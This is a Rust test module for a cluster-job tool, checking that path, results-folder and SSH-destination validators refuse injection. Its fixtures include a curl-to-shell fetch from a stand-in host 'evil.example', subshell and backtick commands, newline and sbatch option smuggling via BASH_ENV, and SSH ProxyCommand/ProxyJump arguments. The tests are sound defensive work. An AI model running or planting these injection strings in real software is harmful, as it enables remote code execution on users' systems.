        for bad in [
            "/scratch/$USER/\"quoted\"",
            "/scratch/$(id)",
            "/scratch/`whoami`",
            "/scratch/$OTHER",
            "/scratch/${USER",
            "/scratch/a b",
            "/scratch/../etc",
            "scratch/$USER",
        ] {
            assert!(
                validate_scratch_template(bad).is_err(),
                "{bad} must be refused"
            );
        }
        let error = validate_scratch_template("/scratch/$(id)").expect_err("subshell");
        assert!(error.contains("scratch folder"), "{error}");
        assert!(!error.contains("defaults."), "{error}");
    }

    #[test]
    fn no_site_defaults_in_the_types() {
        let defaults = JobDefaults::default();
        assert!(defaults.partition.is_none());
        let env = EnvironmentSetup::default();
        assert_eq!(env.coperceive_command, vec!["coperceive".to_string()]);
        assert!(!env.compute_has_internet);
        let request = JobRequest {
            job_name: "coperceive-x".into(),
            command_argv: vec!["coperceive".into(), "eval".into()],
            partition: None,
            account: None,
            qos: None,
            gres: None,
            time_limit: None,
            memory: None,
            cpus_per_task: None,
        };
        assert!(request.partition.is_none());
        let _ = Discovery {
            scheduler: SchedulerKind::None,
            partitions: Vec::new(),
            gpu_types: Vec::new(),
        };
    }

    #[test]
    fn results_root_is_shared_storage_not_scratch() {
        let mut profile = alpha();
        profile.results_root = "/scratch/shared".into();
        assert!(profile.validate().is_err());
        profile.results_root = "/data/projects/alpha/runs".into();
        profile.validate().expect("valid");
        profile
            .validate_output_dir("/data/projects/alpha/runs/run-1")
            .expect("inside results root");
        assert!(profile.validate_output_dir("/etc/out").is_err());
        profile
            .validate_pipeline_script("/data/projects/alpha/code/bev.py")
            .expect("inside code root");
        assert!(profile.validate_pipeline_script("/etc/passwd").is_err());
        assert!(profile.validate_pipeline_script("../bev.py").is_err());
    }

    #[test]
    fn pipeline_spec_refuses_absolute_scripts_and_known_contract() {
        let spec = PipelineSpec {
            name: "bev-fusion".into(),
            script: "pipelines/bev_fusion.py".into(),
            interpreter: vec!["python3".into()],
            environment: EnvironmentSetup::default(),
            arguments: vec![ArgumentSpec {
                name: "checkpoint".into(),
                kind: ArgumentKind::Path,
                help: "weights".into(),
                required: true,
                default: None,
                choices: Vec::new(),
                multiple: false,
                role: ArgumentRole::Checkpoint,
            }],
            output_contract: "coperceive-pipeline-1".into(),
            description: String::new(),
        };
        spec.validate().expect("valid pipeline");
        let mut bad = spec.clone();
        bad.script = "../inside.py".into();
        assert!(bad.validate().is_err());
        bad.script = "pipelines/bev_fusion.py".into();
        bad.output_contract = "other".into();
        assert!(bad.validate().is_err());
        let text = serde_json::to_string(&spec).expect("json");
        let back: PipelineSpec = serde_json::from_str(&text).expect("back");
        assert_eq!(back, spec);
    }

    #[test]
    fn normalise_path_handles_tilde_roots_without_panicking() {
        assert_eq!(normalise_path("~", "root").expect("home"), "~");
        assert_eq!(normalise_path("~/", "root").expect("home slash"), "~");
        assert_eq!(normalise_path("~/data", "root").expect("home data"), "~/data");
        assert_eq!(
            normalise_path("~/data//scenes/./x", "root").expect("noise"),
            "~/data/scenes/x"
        );
        // "~user" is not the remote home; refuse it plainly instead of panicking.
        assert!(normalise_path("~user/data", "root").is_err());
        assert_eq!(normalise_path("/a//b/./c", "root").expect("absolute"), "/a/b/c");
        assert_eq!(normalise_path("/", "root").expect("slash"), "/");
    }

    #[test]
    fn path_traversal_is_refused_after_normalisation() {
        let profile = ServerProfile {
            results_root: "/shared/runs".into(),
            code_roots: vec!["/shared/code".into()],
            ..alpha()
        };
        profile.validate().expect("valid profile");
        assert!(profile.validate_output_dir("/shared/runs/../scratch/x").is_err());
        assert!(profile.validate_output_dir("/shared/runs/../../etc/passwd").is_err());
        assert!(profile.validate_output_dir("/shared/../shared/runs/out").is_err());
        // Normal noise is normalised, not rejected.
        profile
            .validate_output_dir("/shared//runs/./run-1/")
            .expect("normalised inside results root");
        assert!(profile.validate_pipeline_script("code/../outside.py").is_err());
        assert!(profile.validate_pipeline_script("/shared/code/../secret.py").is_err());
        profile
            .validate_pipeline_script("/shared/code/bev.py")
            .expect("inside code root");
        // results_root cannot be smuggled into scratch through '..' or '.'.
        let mut scratch = profile.clone();
        scratch.results_root = "/shared/../scratch/shared".into();
        assert!(scratch.validate().is_err());
        let mut dotted = profile;
        dotted.results_root = "/scratch/./shared".into();
        assert!(dotted.validate().is_err());
    }

    /// Values that job scripts would evaluate: `OUT_DIR="<results_root>/runs/<id>"`
    /// runs `$(...)`, backticks and a closing `"`, and a line break turns the rest
    /// of an `#SBATCH --output=<results_root>/...` line into a shell command.
    const SCRIPT_BREAKING_PATHS: &[&str] = &[
        "/data/lab/x$(curl${IFS}-fsS${IFS}evil.example|sh)",
        "/data/lab/x${IFS}",
        "/data/lab/$HOME",
        "/data/lab/x`id`",
        "/data/lab/x\";touch marker;\"",
        "/data/lab/x\\\"y",
        "/dev/null\necho INJECTED_LINE_RAN #",
        "/data/lab/x\rcarriage",
        "/data/lab/x\ttab",
        "/data/lab/x\u{7f}del",
    ];

    #[test]
    fn results_root_refuses_shell_metacharacters_and_control_characters() {
        for bad in SCRIPT_BREAKING_PATHS {
            let mut profile = alpha();
            profile.results_root = (*bad).to_string();
            let error = profile
                .validate()
                .expect_err(&format!("results_root {bad:?} must be refused"));
            assert!(error.contains("results folder"), "{bad:?}: {error}");
        }
    }

    #[test]
    fn code_roots_refuse_shell_metacharacters_and_control_characters() {
        for bad in SCRIPT_BREAKING_PATHS {
            let mut profile = alpha();
            profile.code_roots = vec!["/data/projects/alpha/code".into(), (*bad).to_string()];
            let error = profile
                .validate()
                .expect_err(&format!("code root {bad:?} must be refused"));
            assert!(error.contains("code folder"), "{bad:?}: {error}");
        }
    }

    #[test]
    fn results_root_must_be_absolute_because_job_scripts_never_expand_tilde() {
        for tilde in ["~/runs", "~", "~/", "~alice/runs"] {
            let mut profile = alpha();
            profile.results_root = tilde.to_string();
            let error = profile
                .validate()
                .expect_err(&format!("results_root {tilde:?} must be refused"));
            assert!(error.contains("absolute path"), "{tilde:?}: {error}");
            assert!(error.contains("'/'"), "{tilde:?}: {error}");
        }
    }

    #[test]
    fn legitimate_results_and_code_roots_still_validate() {
        for (results_root, code_roots) in [
            ("/data/projects/alpha/runs", vec!["/data/projects/alpha/code"]),
            ("/home/dana/results", vec![]),
            ("/data/results/", vec!["/data/code/"]),
            ("/gpfs/lab-01/user_x/runs.v2", vec!["/gpfs/lab-01/code@2024"]),
            // A code root never reaches an #SBATCH line (it is a shell-quoted
            // argument), so spaces and apostrophes stay allowed there. A results
            // folder with them is refused: see
            // results_root_that_sbatch_would_split_into_options_is_refused.
            ("/data/projects/alpha/runs", vec!["/data/My Lab/code", "/data/o'brien/code"]),
            ("/data/results:2024+%,=", vec![]),
            // A code root may be relative to the remote HOME: the plan checks
            // expand it there (run_plan::expand_root_with_home).
            ("/data/projects/alpha/runs", vec!["~/code", "~"]),
        ] {
            let mut profile = alpha();
            profile.results_root = results_root.to_string();
            profile.code_roots = code_roots.iter().map(|root| root.to_string()).collect();
            profile
                .validate()
                .unwrap_or_else(|error| panic!("{results_root:?} {code_roots:?}: {error}"));
        }
    }

    /// Results folders that sbatch would not read as one `--output=<path>` token:
    /// it splits `#SBATCH` lines at whitespace, ends them at an unquoted '#', and
    /// treats quotes as quoting (an unmatched one is an error).
    const SBATCH_SPLITTING_RESULTS_ROOTS: &[&str] = &[
        "/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
        "/data/lab/r --output=/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
        "/data/lab/r --chdir=/data/lab/evil --comment=x",
        "/data/My Lab/runs",
        "/data/o'brien/runs",
        "/data/lab#2/runs",
        "/data/lab/'--export=ALL'",
        "/data/lab/runs ",
        "/data/lab/r\u{a0}--chdir=/tmp",
    ];

    #[test]
    fn results_root_that_sbatch_would_split_into_options_is_refused() {
        for bad in SBATCH_SPLITTING_RESULTS_ROOTS {
            let mut profile = alpha();
            profile.results_root = (*bad).to_string();
            let error = profile
                .validate()
                .expect_err(&format!("results_root {bad:?} must be refused"));
            assert!(error.contains("results folder"), "{bad:?}: {error}");
            assert!(error.contains("#SBATCH"), "{bad:?}: {error}");
            assert!(error.contains("spaces, '#' or quotes"), "{bad:?}: {error}");
            let error = validate_results_root(bad).expect_err(bad);
            assert!(error.contains("#SBATCH"), "{bad:?}: {error}");
        }
    }

    #[test]
    fn an_output_dir_that_job_scripts_would_run_is_refused_even_inside_results_root() {
        // A saved plan is re-read from the cluster; its output_dir must not carry
        // what the results_root check refuses.
        let profile = alpha();
        for bad in SCRIPT_BREAKING_PATHS {
            let inside = format!("/data/projects/alpha/runs/{}", bad.trim_start_matches('/'));
            let error = profile
                .validate_output_dir(&inside)
                .expect_err(&format!("output dir {inside:?} must be refused"));
            assert!(error.contains("output folder"), "{inside:?}: {error}");
        }
        profile
            .validate_output_dir("/data/projects/alpha/runs/runs/plan-1763300000-a1b2c3d4e5f6")
            .expect("a saved plan's output dir");
        profile
            .validate_output_dir("/data/projects/alpha/runs/plans")
            .expect("the plans folder");
    }

    #[test]
    fn normalise_path_refuses_control_characters() {
        for bad in ["/data/a\nb", "/data/a\rb", "/data/a\tb", "~/a\nb"] {
            let error = normalise_path(bad, "root").expect_err(&format!("{bad:?}"));
            assert!(error.contains("control character"), "{bad:?}: {error}");
        }
    }

    #[test]
    fn ssh_destination_parts_may_not_look_like_an_ssh_option() {
        let mut alias = alpha();
        alias.ssh_alias = Some("-oProxyCommand=touch /tmp/marker".into());
        assert!(alias.validate().unwrap_err().contains("'-'"));
        assert!(alias.ssh_target().unwrap_err().contains("'-'"));

        let mut host = alpha();
        host.ssh_alias = None;
        host.host = Some("-oProxyCommand=touch /tmp/marker".into());
        assert!(host.validate().unwrap_err().contains("'-'"));
        assert!(host.ssh_target().unwrap_err().contains("'-'"));

        let mut user = alpha();
        user.ssh_alias = None;
        user.host = Some("login.example".into());
        user.user = Some("-oProxyJump=x@evil.example,y".into());
        assert!(user.validate().unwrap_err().contains("'-'"));
        assert!(user.ssh_target().unwrap_err().contains("'-'"));

        // Ordinary names with a dash inside are fine.
        let mut typed = alpha();
        typed.ssh_alias = None;
        typed.host = Some("login-01.cluster-a.example.org".into());
        typed.user = Some("first-last".into());
        typed.validate().expect("dashes inside names are fine");
        assert_eq!(
            typed.ssh_target().expect("target"),
            "first-last@login-01.cluster-a.example.org"
        );
    }
}
